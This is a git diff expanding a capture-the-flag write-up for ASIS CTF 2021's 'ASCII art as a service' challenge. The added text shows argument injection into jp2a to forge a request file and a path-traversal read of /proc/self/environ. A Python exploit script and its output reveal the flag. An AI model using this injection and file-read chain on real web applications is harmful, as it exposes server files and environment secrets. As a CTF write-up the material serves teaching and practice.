@@ -222,12 +222,12 @@ function clearOutput(){
 ```
 
 #### **Summary**:
-* This /flag endpoint was useless for my solution, so I'll just ignore it (looking forward for writeups using it!).
+* This /flag endpoint was useless for my solution, so I'll just ignore it. If you used it in your solution, please tell me on Twitter :)
 * The clearOutput deletes both the request and output files every 2 minutes. It's saving earth resources. #begreen!
 
 ## Let's play a game
 
-![riddler](img/batman_riddle.jpg)
+![riddler](img/batman_riddle.png)
 
 So far we got a possible command injection when inserting data.
 
@@ -282,9 +282,259 @@ I also don't know about any local file that could help. But let's move on.
 * The **--html-title** is even more interesting: I can put a string from my control here. But even with this controlled HTML, I don't get near the flag.
 * The **--output=** is the holy grail. We can save the result ascii file inside the server, on a path of our control!!
 
-But... how this takes us near the Flag?
+Let's make a simple test of it:
 
+```html
+$ timeout 5 jp2a --html --html-title="MY CONTROLLED STRING" --output=/tmp/asis_output.html /tmp/asis.jpg
+$ 
+$ head -10 /tmp/asis_output.html
 
+<?xml version='1.0' encoding='ISO-8859-1'?>
+<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
+<html xmlns='http://www.w3.org/1999/xhtml' lang='en' xml:lang='en'>
+<head>
+<title>MY CONTROLLED STRING</title>
+<style type='text/css'>
+body {
+background-color: black;
+}
+.ascii {
+$
+```
+
+Good but... how the hell this takes us near the Flag?
+
+## Hacktion Plan
+
+Things we have so far:
+* We can inject interesting parameters on j2pa.
+* We can control the order of the parameters after the "j2pa" string.
+* We can write jp2a output anywhere in the system (if the app user has privileges).
+* We can control the written file name.
+* We can inject a controlled string in the file.
+
+Now we can connect this with the previous finding: we can write a fake request on the request directory!
+
+The request dir contains request files with a simple format.
+
+```
+<TOKEN>|<SESSION_ID>|<STATUS OR OUTPUT FILE NAME>
+```
+
+If we can forge a file like that and request using the /request/:ID route, we can get our LFI!
+
+Let's check each part of the file:
+* The Token is not validated when reading the file.. it can be any garbage :)
+* The Session ID is part of our session cookie - connect.sid - we just received if from the server.
+e.g.
+
+s%3A**Tej5L70Hl3d_5nWQGjfzXnMi1IP5HMV2**.
+YJrAvk995JtNCl714an3cB72qi01HuZq6Q2GJUu9IsU
+
+* The last part is the file name that the server will send to us, without any validation. The game is on.
+
+Using our new jp2a parameters, we can create an HTML output that simulates this format, using the **--html-title** to inject our pipe-separated payload and the **--output=** to add it to the request directory!
+
+Let's make a local experiment, from our previous command.
+
+```html
+$ timeout 5 jp2a --html --html-title="TOKEN|SESSION_ID|FILE_NAME" --output=./request/asis_output.html /tmp/asis.jpg
+$ 
+$ head -10 ./request/asis_output.html
+
+<?xml version='1.0' encoding='ISO-8859-1'?>
+<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
+<html xmlns='http://www.w3.org/1999/xhtml' lang='en' xml:lang='en'>
+<head>
+<title>TOKEN|SESSION_ID|FILE_NAME</title>
+<style type='text/css'>
+body {
+background-color: black;
+}
+.ascii {
+$
+```
+
+Nice! if I'm inside the app dir (like the real app will be), I can output the file in the request folder.
+
+Let's think of our current scenario and validations to bypass:
+
+* The generated filename is "asis_output.html", which won't pass the token format validation (regex). 
+    * Easy bypass: we can control the file name.
+* When spliting the (entire html) file by pipes, we have:
+    1. TOKEN: From **"<?xml "** to **"TOKEN"** - No problem. Token is not validated.
+    2. SESSION_ID: Just **"SESSION_ID"** - Only replace with the session ID we got.
+    3. FILE NAME: From **"FILE_NAME</title>"** to **"</html>"** (end of document!) - we have some work to do here.
+
+This is the line that reads and parses the pipe file:
+
+```javascript
+const [origReqToken,ownerSessid,result] = fs.readFileSync(reqFilename).toString().split("|")
+```
+
+This splits the entire file string in an array, where each element is a part of the file separated by the pipes. Then it sets the array values to each variable. If we have more items than variables, it just ignores the rest of the array!
+
+If we put one more pipe in our html title, it will just ignore the rest of the file :)
+
+Let's go for another local round, now simulating the server parsing:
+
+* Generate output
+```html
+$ timeout 5 jp2a --html --html-title="ANY_TRASH|SESSION_ID|FILE_NAME|" --output=./request/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /tmp/asis.jpg
+$ 
+$ head -10 ./request/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
+<?xml version='1.0' encoding='ISO-8859-1'?>
+<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
+<html xmlns='http://www.w3.org/1999/xhtml' lang='en' xml:lang='en'>
+<head>
+<title>ANY_TRASH|SESSION_ID|FILE_NAME|</title>
+<style type='text/css'>
+body {
+background-color: black;
+}
+.ascii {
+$ 
+```
+
+* Simulate server
+
+```javascript
+$ node
+Welcome to Node.js v14.12.0.
+Type ".help" for more information.
+
+> const reqToken = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
+undefined
+> reqToken
+'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+
+> const reqFilename = `./request/${reqToken}`
+undefined
+> reqFilename
+'./request/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+
+> if(!/^[a-zA-Z0-9]{32}$/.test(reqToken) || !fs.existsSync(reqFilename)) { console.log('FILTER FAILED'); } else { console.log('PASSED'); }
+PASSED
+
+undefined
+> const [origReqToken,ownerSessid,result] = fs.readFileSync(reqFilename).toString().split("|");
+undefined
+> ownerSessid
+'SESSION_ID'
+
+> result
+'FILE_NAME'
+
+>
+```
+
+It worked fine! We bypassed the simulated filters and the variables where injected with our poisoned values!
+
+## Exploiting
+
+Now that we have our PoC, let's make it happen in the real webapp. And I think it's simpler to automate it than showing it with curl / chrome.
+
+[Exploit](https://github.com/Neptunians/asisctf-2021-writeup-ascii_art_as_a_service/blob/main/exploit.py)
+
+Let's break the exploit in smaller pieces:
+
+```python
+# .. ignoring imports for simplicity
+target = 'http://asciiart.asisctf.com:9000'
+
+# Get Session ID (index does not set session. Go for /flag at first)
+s = requests.Session()
+s.get(f'{target}/flag')
+
+session_cookie = s.cookies['connect.sid']
+session_id = session_cookie.split('.')[0][4:]
+
+print('Session ID: "{}"'.format(session_cookie.split('.')[0][4:].strip()))
+```
+
+* We make a request to /flag, just to get the session cookie (they will not give you the flag)
+    * The main page does not set the cookie :D
+* We decode the connect.sid cookie to get the session id
+
+```python
+# ... ignoring headers for simplicity
+env_file = '../../../../../../../../../../proc/self/environ'
+title_payload = f'--html-title="anyshit|{session_id}|{env_file}|hello'
+attack_file = 'neptunian0'+'n'*22
+output_paload = f'--output=./request/{attack_file}'
+```
+
+* Set **env_file** (file name) for the target of our LFI: since the flag comes from the environment variables, we can read it from the **/proc/self/environ** (environments from the current process).
+    * The file name validation starts with a ".", so let's go with path traversal.
+* The **title_payload** is our piped payload (the string to inject in the file)
+    * It includes the file name (LFI) of the previous step.
+* The **attack_file** is the request file name, following the regex pattern.
+* The **output_paload** is the file output which we will inject.
+
+```python
+data = {
+    "url": [
+        "https://images.all-free-download.com/images/graphiclarge/animal_pictures_08_hd_picture_168987.jpg",
+        "--html",
+        title_payload,
+        output_paload
+    ]
+}
+```
+
+* **data** is the JSON body of the post
+    * As planned, we just inject the parameters in the array using the payloads of the previous step.
+
+```python
+response = s.post(f'{target}/request', headers=headers, json=data, verify=False)
+
+print(response.status_code)
+print(response.text)
+```
+
+* We made all the setup before. Just send it to the /request route.
+    * Print the first request status (Usually "Processing...")
+
+```python
+time.sleep(2)
+
+response = s.get(f'{target}/request/{attack_file}')
+
+print(response.status_code)
+print(response.text)
+```
+
+* Let's wait 2 seconds for our payload to work and then get the result of our fake inject using the invented ID (**attack_file**).
+
+```python
+env_result = json.loads(response.text)['result']
+
+print(env_result)
+position = env_result.find("FLAG=")
+print('\n\n', env_result[position:position+100])
+```
+
+* Let's parse the result and find the flag inside it :)
+
+![Logo](img/finish_him.jpg)
+
+```bash
+$ python exploit.py 
+Session ID: "BDRUX_2OcjxpR4rG1aeHlgNbc84yLnC3"
+200
+{"failed":true,"result":"Processing..."}
+200
+{"failed":false,"result":"HOSTNAME=45527e0e03b4\u0000HOME=/home/www\u0000TERM=xterm\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000DEBIAN_FRONTEND=noninteractive\u0000PWD=/app\u0000FLAG=ASIS{ascii_art_is_the_real_art_o/_a39bc8}\u0000NODE_ENV=production\u0000"}
+HOSTNAME=45527e0e03b4HOME=/home/wwwTERM=xtermPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binDEBIAN_FRONTEND=noninteractivePWD=/appFLAG=ASIS{ascii_art_is_the_real_art_o/_a39bc8}NODE_ENV=production
+
+FLAG=ASIS{ascii_art_is_the_real_art_o/_a39bc8}NODE_ENV=production
+```
+
+Gotcha!
+
+```
+ASIS{ascii_art_is_the_real_art_o/_a39bc8}
+```
 
 ## References
 
